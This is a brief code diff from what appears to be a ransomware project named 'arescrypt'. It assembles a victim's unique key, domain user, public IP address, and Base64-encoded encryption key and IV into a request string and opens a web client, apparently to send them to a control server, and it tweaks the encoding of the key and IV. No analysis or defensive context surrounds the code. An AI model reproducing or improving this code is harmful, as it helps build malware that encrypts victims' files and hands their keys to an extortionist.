@@ -32,12 +32,12 @@ namespace arescrypt
         {
             JToken IPInfo = JObject.Parse(Miscellaneous.GetPublicIPAddress());
             string userIPAddr = (string)IPInfo.SelectToken("ip");
-
+                       
             string userParams = "uniqueKey=" + userData.getUniqueKey() +
                 "&userDomUser=" + Configuration.userDomUser +
                 "&userIPAddr=" + userIPAddr +
-                "&encKey=" + Convert.ToBase64String(Cryptography.encKey) +
-                "&encIV=" + Convert.ToBase64String(Cryptography.encIV);
+                "&encKey=" + Convert.ToBase64String(Cryptography.encKey).Replace(" ", "+") +
+                "&encIV=" + Convert.ToBase64String(Cryptography.encIV).Replace(" ", "+");
             
             using (WebClient wc = new WebClient())
             {
